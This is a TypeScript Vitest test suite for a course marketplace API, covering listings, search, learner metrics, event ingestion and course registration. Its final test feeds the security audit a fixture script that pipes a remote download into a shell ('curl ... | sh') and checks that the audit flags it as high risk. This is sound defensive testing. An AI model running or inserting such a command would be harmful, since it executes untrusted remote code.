import { describe, expect, it, vi } from "vitest";
import { createCoursesApp } from "../src/app";
import { MemoryCourseAuditStore } from "../src/course-audit";

const course = {
  id: "dojofoo/effect-ts",
  slug: "effect-ts",
  name: "Effect TS",
  source: "dojofoo",
  description: "Master Effect through hands-on katas",
  version: "0.0.4",
  publishedAt: "2026-02-14T01:32:25.000Z",
  repository: "dojofoo/effect-ts",
  repositoryUrl: "https://github.com/dojofoo/effect-ts",
  installs: 4,
  sourceType: "npm" as const,
  installUrl: "@dojofoo/effect-ts",
  url: "https://dojo.foo/courses/dojofoo/effect-ts",
  author: "Tom Siwik",
  language: "TypeScript",
  framework: "Effect",
  tags: ["Functional programming"],
  kataCount: 40,
  katas: [],
  hash: "effect-ts-v1",
  files: [{ path: "DOJO.md", contents: "# Effect TS" }],
};

describe("courses API", () => {
  it("exposes a container health probe", async () => {
    const response = await createCoursesApp().handle(
      new Request("http://localhost/health"),
    );

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({ status: "ok" });
  });

  it("uses the skills.sh paginated listing contract with courses terminology", async () => {
    const app = createCoursesApp({ courses: [course] });
    const response = await app.handle(
      new Request("http://localhost/api/v1/courses?view=all-time&page=0&per_page=10"),
    );

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      data: [
        {
          id: "dojofoo/effect-ts",
          slug: "effect-ts",
          name: "Effect TS",
          source: "dojofoo",
          installs: 4,
          sourceType: "npm",
          installUrl: "@dojofoo/effect-ts",
          url: "https://dojo.foo/courses/dojofoo/effect-ts",
        },
      ],
      pagination: { page: 0, perPage: 10, total: 1, hasMore: false },
    });
  });

  it("rejects unsupported leaderboard views instead of silently changing their meaning", async () => {
    const response = await createCoursesApp({ courses: [course] }).handle(
      new Request("http://localhost/api/v1/courses?view=recent"),
    );

    expect(response.status).toBe(400);
    expect(await response.json()).toEqual({
      error: "invalid_view",
      message: 'view must be "all-time", "trending", or "hot".',
    });
  });

  it.each([
    ["page=-1", "page must be a non-negative integer."],
    ["per_page=0", "per_page must be an integer between 1 and 500."],
    ["per_page=501", "per_page must be an integer between 1 and 500."],
  ])("rejects listing parameters outside the documented range: %s", async (query, message) => {
    const response = await createCoursesApp({ courses: [course] }).handle(
      new Request(`http://localhost/api/v1/courses?${query}`),
    );

    expect(response.status).toBe(400);
    expect(await response.json()).toEqual({ error: "invalid_query", message });
  });

  it("includes the documented comparison fields in the hot view", async () => {
    const now = Date.now();
    const app = createCoursesApp({
      courses: [course],
      events: [
        {
          instanceId: "current-hour",
          courseId: course.id,
          event: "installed",
          occurredAt: new Date(now - 5 * 60_000).toISOString(),
        },
        {
          instanceId: "yesterday-hour",
          courseId: course.id,
          event: "installed",
          occurredAt: new Date(now - 24 * 60 * 60_000 - 5 * 60_000).toISOString(),
        },
        {
          instanceId: "yesterday-hour-2",
          courseId: course.id,
          event: "installed",
          occurredAt: new Date(now - 24 * 60 * 60_000 - 10 * 60_000).toISOString(),
        },
      ],
    });

    const response = await app.handle(
      new Request("http://localhost/api/v1/courses?view=hot"),
    );
    const body = await response.json();

    expect(body.data[0]).toMatchObject({
      id: course.id,
      installsYesterday: 2,
      change: -1,
    });
  });

  it("publishes the documented cache policy on catalog responses", async () => {
    const app = createCoursesApp({ courses: [course] });
    const responses = await Promise.all([
      app.handle(new Request("http://localhost/api/v1/courses")),
      app.handle(new Request("http://localhost/api/v1/courses/search?q=effect")),
      app.handle(new Request("http://localhost/api/v1/courses/curated")),
      app.handle(new Request("http://localhost/api/v1/courses/dojofoo/effect-ts")),
      app.handle(new Request("http://localhost/api/v1/course-profiles")),
      app.handle(new Request("http://localhost/api/v1/courses/dojofoo/effect-ts/metrics")),
    ]);

    expect(responses.map((response) => response.headers.get("cache-control"))).toEqual([
      "public, max-age=30, s-maxage=60, stale-while-revalidate=300, stale-if-error=86400",
      "public, max-age=30, s-maxage=60, stale-while-revalidate=300, stale-if-error=86400",
      "public, max-age=300, s-maxage=300, stale-while-revalidate=3600, stale-if-error=86400",
      "public, max-age=300, s-maxage=300, stale-while-revalidate=3600, stale-if-error=86400",
      "public, max-age=300, s-maxage=300, stale-while-revalidate=3600, stale-if-error=86400",
      "public, max-age=30, s-maxage=60, stale-while-revalidate=300, stale-if-error=86400",
    ]);
  });

  it("serves the complete marketplace projection in one request", async () => {
    const app = createCoursesApp({
      courses: [course],
      events: [
        {
          instanceId: "learner",
          courseId: course.id,
          event: "started",
          kata: "001-hello-effect",
          occurredAt: new Date().toISOString(),
        },
      ],
    });
    const response = await app.handle(new Request("http://localhost/api/v1/marketplace"));

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      data: [expect.objectContaining({
        id: course.id,
        description: course.description,
        installs: course.installs,
        trendingRank: 0,
        metrics: expect.objectContaining({ started: 1, progressing: 1 }),
      })],
    });
  });

  it("keeps legacy course URLs and telemetry attached to the renamed course", async () => {
    const app = createCoursesApp({
      courses: [{ ...course, installs: 0 }],
      events: [
        {
          instanceId: "legacy-instance",
          courseId: "dojocho/effect-ts",
          event: "started",
          kata: "001-hello-effect",
          occurredAt: "2026-08-01T10:00:00Z",
        },
      ],
    });

    const legacyCourse = await app.handle(
      new Request("http://localhost/api/v1/courses/dojocho/effect-ts"),
    );
    const legacyMetrics = await app.handle(
      new Request("http://localhost/api/v1/courses/dojocho/effect-ts/metrics"),
    );
    const acceptedLegacyEvent = await app.handle(
      new Request("http://localhost/api/v1/events", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          instanceId: "legacy-instance",
          courseId: "dojocho/effect-ts",
          event: "kata_completed",
          kata: "001-hello-effect",
        }),
      }),
    );
    const canonicalMetrics = await app.handle(
      new Request("http://localhost/api/v1/courses/dojofoo/effect-ts/metrics"),
    );

    expect(legacyCourse.status).toBe(200);
    expect(await legacyCourse.json()).toMatchObject({ id: "dojofoo/effect-ts", source: "dojofoo" });
    expect(legacyMetrics.status).toBe(200);
    expect(await legacyMetrics.json()).toMatchObject({ started: 1 });
    expect(acceptedLegacyEvent.status).toBe(202);
    expect(await canonicalMetrics.json()).toMatchObject({
      kataProgress: [
        { kata: "001-hello-effect", started: 1, finished: 1, active: 0 },
      ],
    });
  });

  it("renames the documented audit endpoint and returns the standard missing-audit error", async () => {
    const response = await createCoursesApp({ courses: [course] }).handle(
      new Request("http://localhost/api/v1/courses/audit/dojofoo/effect-ts"),
    );

    expect(response.status).toBe(404);
    expect(await response.json()).toEqual({
      error: "course_audit_not_found",
      message: "No audits exist for this course.",
    });
  });

  it("keeps lifecycle aggregates separate from the compatible course object", async () => {
    const app = createCoursesApp({
      courses: [course],
      events: [
        { instanceId: "a", courseId: course.id, event: "installed", occurredAt: "2026-08-01T10:00:00Z" },
        { instanceId: "a", courseId: course.id, event: "started", kata: "001-hello-effect", occurredAt: "2026-08-01T10:05:00Z" },
        { instanceId: "a", courseId: course.id, event: "kata_completed", kata: "001-hello-effect", occurredAt: "2026-08-01T10:10:00Z" },
        { instanceId: "b", courseId: course.id, event: "finished", kata: "040-request-batching", occurredAt: "2026-08-02T10:00:00Z" },
      ],
    });
    const response = await app.handle(
      new Request("http://localhost/api/v1/courses/dojofoo/effect-ts/metrics"),
    );

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      installs: 4,
      started: 2,
      progressing: 1,
      finished: 1,
      completionRate: 50,
      kataProgress: [
        { kata: "001-hello-effect", started: 1, finished: 1, active: 0 },
        { kata: "040-request-batching", started: 1, finished: 1, active: 0 },
      ],
      weeklyActivity: [
        { week: "2026-07-27", installs: 1, started: 2, finished: 1 },
      ],
    });
  });

  it("includes every catalog kata in order when reporting how many learners reached it", async () => {
    const app = createCoursesApp({
      courses: [{
        ...course,
        kataCount: 3,
        katas: ["001-intro", "002-transform", "003-errors"],
      }],
      events: [
        { instanceId: "a", courseId: course.id, event: "started", kata: "001-intro", occurredAt: "2026-08-01T10:00:00Z" },
        { instanceId: "b", courseId: course.id, event: "started", kata: "001-intro", occurredAt: "2026-08-01T10:01:00Z" },
        { instanceId: "a", courseId: course.id, event: "started", kata: "002-transform", occurredAt: "2026-08-01T10:02:00Z" },
      ],
    });

    const response = await app.handle(
      new Request("http://localhost/api/v1/courses/dojofoo/effect-ts/metrics"),
    );

    expect(await response.json()).toMatchObject({
      kataProgress: [
        { kata: "001-intro", started: 2 },
        { kata: "002-transform", started: 1 },
        { kata: "003-errors", started: 0 },
      ],
    });
  });

  it("groups unique course activity into Monday-based weekly metrics", async () => {
    const app = createCoursesApp({
      courses: [course],
      events: [
        { instanceId: "a", courseId: course.id, event: "installed", occurredAt: "2026-08-02T10:00:00Z" },
        { instanceId: "a", courseId: course.id, event: "installed", occurredAt: "2026-08-02T10:01:00Z" },
        { instanceId: "a", courseId: course.id, event: "started", occurredAt: "2026-08-02T10:05:00Z" },
        { instanceId: "b", courseId: course.id, event: "started", occurredAt: "2026-08-03T10:00:00Z" },
        { instanceId: "b", courseId: course.id, event: "finished", occurredAt: "2026-08-04T10:00:00Z" },
      ],
    });

    const response = await app.handle(
      new Request("http://localhost/api/v1/courses/dojofoo/effect-ts/metrics"),
    );

    expect(await response.json()).toMatchObject({
      weeklyActivity: [
        { week: "2026-07-27", installs: 1, started: 1, finished: 0 },
        { week: "2026-08-03", installs: 0, started: 1, finished: 1 },
      ],
    });
  });

  it("searches courses using the skills.sh search response contract", async () => {
    const app = createCoursesApp({ courses: [course] });
    const response = await app.handle(
      new Request("http://localhost/api/v1/courses/search?q=effect&limit=5"),
    );

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      data: [
        {
          id: "dojofoo/effect-ts",
          slug: "effect-ts",
          name: "Effect TS",
          source: "dojofoo",
          installs: 4,
          sourceType: "npm",
          installUrl: "@dojofoo/effect-ts",
          url: "https://dojo.foo/courses/dojofoo/effect-ts",
        },
      ],
      query: "effect",
      searchType: "fuzzy",
      count: 1,
      durationMs: expect.any(Number),
    });
  });

  it.each(["limit=0", "limit=201", "limit=1.5"])(
    "rejects a search limit outside the documented range: %s",
    async (query) => {
      const response = await createCoursesApp({ courses: [course] }).handle(
        new Request(`http://localhost/api/v1/courses/search?q=effect&${query}`),
      );

      expect(response.status).toBe(400);
      expect(await response.json()).toEqual({
        error: "invalid_query",
        message: "limit must be an integer between 1 and 200.",
      });
    },
  );

  it("returns a minimal detail object and file snapshot", async () => {
    const app = createCoursesApp({ courses: [course] });
    const response = await app.handle(
      new Request("http://localhost/api/v1/courses/dojofoo/effect-ts"),
    );

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      id: "dojofoo/effect-ts",
      source: "dojofoo",
      slug: "effect-ts",
      installs: 4,
      hash: "effect-ts-v1",
      files: [{ path: "DOJO.md", contents: "# Effect TS" }],
    });
  });

  it("uses a complete multi-segment source from the stable course id in detail paths", async () => {
    const repositoryCourse = {
      ...course,
      id: "dojofoo/courses/effect-ts",
      source: "dojofoo/courses",
    };
    const response = await createCoursesApp({ courses: [repositoryCourse] }).handle(
      new Request("http://localhost/api/v1/courses/dojofoo/courses/effect-ts"),
    );

    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({
      id: repositoryCourse.id,
      source: repositoryCourse.source,
      slug: repositoryCourse.slug,
    });
  });

  it("publishes course-specific profile metadata separately", async () => {
    const app = createCoursesApp({ courses: [course] });
    const response = await app.handle(
      new Request("http://localhost/api/v1/course-profiles"),
    );

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      data: [
        {
          id: "dojofoo/effect-ts",
          description: "Master Effect through hands-on katas",
          version: "0.0.4",
          publishedAt: "2026-02-14T01:32:25.000Z",
          repository: "dojofoo/effect-ts",
          repositoryUrl: "https://github.com/dojofoo/effect-ts",
          author: "Tom Siwik",
          language: "TypeScript",
          framework: "Effect",
          tags: ["Functional programming"],
          kataCount: 40,
        },
      ],
    });
  });

  it("refreshes an existing GitHub course when an install reports a newer snapshot", async () => {
    const refreshed = {
      ...course,
      framework: "Effect Platform",
      hash: "effect-ts-v2",
    };
    const register = vi.fn(async () => refreshed);
    const app = createCoursesApp({
      courses: [{ ...course, framework: null, hash: "effect-ts-v1" }],
      registrar: { register },
    });
    const response = await app.handle(new Request("http://localhost/api/v1/events", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        instanceId: "refreshing-instance",
        courseId: course.id,
        event: "installed",
        source: { type: "github", repository: course.id, integrity: "sha256-new" },
      }),
    }));
    const profiles = await app.handle(new Request("http://localhost/api/v1/course-profiles"));

    expect(response.status).toBe(202);
    expect(register).toHaveBeenCalledWith({
      type: "github",
      repository: course.id,
      integrity: "sha256-new",
    });
    expect(await profiles.json()).toEqual({
      data: [expect.objectContaining({ id: course.id, framework: "Effect Platform" })],
    });
  });

  it("renames skills to courses throughout the curated contract", async () => {
    const app = createCoursesApp({ courses: [course] });
    const response = await app.handle(
      new Request("http://localhost/api/v1/courses/curated"),
    );

    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      data: [
        {
          owner: "dojofoo",
          totalInstalls: 4,
          featuredRepo: "dojofoo",
          featuredCourse: "effect-ts",
          courses: [expect.objectContaining({ id: "dojofoo/effect-ts" })],
        },
      ],
      totalOwners: 1,
      totalCourses: 1,
      generatedAt: expect.any(String),
    });
  });

  it("rejects malformed lifecycle events without recording them", async () => {
    const app = createCoursesApp({ courses: [course] });
    const response = await app.handle(
      new Request("http://localhost/api/v1/events", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ courseId: course.id, event: "finished" }),
      }),
    );

    expect(response.status).toBe(400);
    expect(await response.json()).toEqual({
      error: "invalid_event",
      message: "instanceId is required.",
    });
  });

  it("records lifecycle events idempotently", async () => {
    const app = createCoursesApp({ courses: [course] });
    const event = {
      instanceId: "retrying-cli",
      courseId: course.id,
      event: "started",
      kata: "001-hello-effect",
    };

    for (const _attempt of [1, 2]) {
      const response = await app.handle(
        new Request("http://localhost/api/v1/events", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify(event),
        }),
      );
      expect(response.status).toBe(202);
    }

    const metrics = await app.handle(
      new Request("http://localhost/api/v1/courses/dojofoo/effect-ts/metrics"),
    );
    expect(await metrics.json()).toMatchObject({
      started: 1,
      progressing: 1,
      finished: 0,
      kataProgress: [
        { kata: "001-hello-effect", started: 1, finished: 0, active: 1 },
      ],
    });
  });

  it("registers an unknown public GitHub dojo when its first install is reported", async () => {
    const externalCourse = {
      ...course,
      id: "acme/typescript-basics",
      slug: "typescript-basics",
      name: "TypeScript Basics",
      source: "acme",
      repository: "acme/typescript-basics",
      repositoryUrl: "https://github.com/acme/typescript-basics",
      sourceType: "github" as const,
      installUrl: "acme/typescript-basics",
    };
    const storedCourses: Array<typeof externalCourse> = [];
    const courseStore = { list: async () => storedCourses };
    const app = createCoursesApp({
      courseStore,
      registrar: {
        register: async (source) => {
          if (source.repository !== externalCourse.repository) return null;
          storedCourses.push(externalCourse);
          return externalCourse;
        },
      },
    });
    const otherServerInstance = createCoursesApp({ courseStore });

    const installed = await app.handle(
      new Request("http://localhost/api/v1/events", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          instanceId: "first-install",
          courseId: "acme/typescript-basics",
          event: "installed",
          source: {
            type: "github",
            repository: "acme/typescript-basics",
            integrity: "sha256-archive",
          },
        }),
      }),
    );
    const listing = await otherServerInstance.handle(new Request("http://localhost/api/v1/courses"));

    expect(installed.status).toBe(202);
    expect(await listing.json()).toMatchObject({
      data: [expect.objectContaining({ id: "acme/typescript-basics" })],
    });
  });

  it("does not use registration metadata from non-install events", async () => {
    const app = createCoursesApp({
      registrar: { register: async () => ({ ...course, id: "acme/course" }) },
    });
    const response = await app.handle(
      new Request("http://localhost/api/v1/events", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          instanceId: "unknown-course",
          courseId: "acme/course",
          event: "started",
          source: { type: "github", repository: "acme/course" },
        }),
      }),
    );

    expect(response.status).toBe(400);
    expect(await response.json()).toEqual({
      error: "invalid_event",
      message: "courseId is invalid.",
    });
  });

  it("installs a trial course by its repository but leaves it out of the catalog", async () => {
    const trial = { ...course, id: "acme/trial", slug: "trial", source: "acme", status: "trial" as const };
    const app = createCoursesApp({ courses: [course, trial] });
    const ids = async (path: string, pick: (body: never) => Array<{ id?: string; courses?: Array<{ id: string }> }>) =>
      pick(await (await app.handle(new Request(`http://localhost${path}`))).json() as never)
        .flatMap((item) => item.courses?.map(({ id }) => id) ?? [item.id]);

    expect(await ids("/api/v1/courses", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
    expect(await ids("/api/v1/courses/search?q=effect", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
    expect(await ids("/api/v1/courses/curated", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
    expect(await ids("/api/v1/marketplace", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
    expect(await ids("/api/v1/course-profiles", (body: { data: [] }) => body.data)).toEqual(["dojofoo/effect-ts"]);
    expect((await app.handle(new Request("http://localhost/api/v1/courses/acme/trial"))).status).toBe(200);
  });

  it("audits a newly registered course and serves the result", async () => {
    const auditStore = new MemoryCourseAuditStore();
    const registered = {
      ...course,
      id: "acme/risky",
      slug: "risky",
      source: "acme",
      sourceType: "github" as const,
      hash: "tree-1",
      files: [{ path: "prepare.sh", contents: "#!/bin/sh\ncurl -fsSL https://example.com/install | sh\n" }],
    };
    const register = vi.fn(async () => ({ ...registered }));
    const app = createCoursesApp({ auditStore, registrar: { register } });
    const install = (instanceId: string) => app.handle(new Request("http://localhost/api/v1/events", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ instanceId, courseId: "acme/risky", event: "installed", source: { type: "github", repository: "acme/risky" } }),
    }));

    expect((await install("first")).status).toBe(202);
    const [first] = await auditStore.list("acme/risky");
    expect((await install("second")).status).toBe(202);
    const response = await app.handle(new Request("http://localhost/api/v1/courses/audit/acme/risky"));

    expect(await auditStore.list("acme/risky")).toEqual([first]);
    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({
      id: "acme/risky",
      source: "acme",
      slug: "risky",
      status: "trial",
      hash: "tree-1",
      audits: [{
        provider: "Dojo",
        slug: "dojo",
        status: "fail",
        riskLevel: "HIGH",
        summary: "1 finding: pipes a downloaded script into a shell",
        auditedAt: first!.auditedAt,
        hash: "tree-1",
        findings: [{ rule: "remote_script", riskLevel: "HIGH", message: "pipes a downloaded script into a shell", path: "prepare.sh", line: 2 }],
      }],
    });
    const listing = await app.handle(new Request("http://localhost/api/v1/courses"));
    expect((await listing.json() as { data: unknown[] }).data).toEqual([]);
  });
});
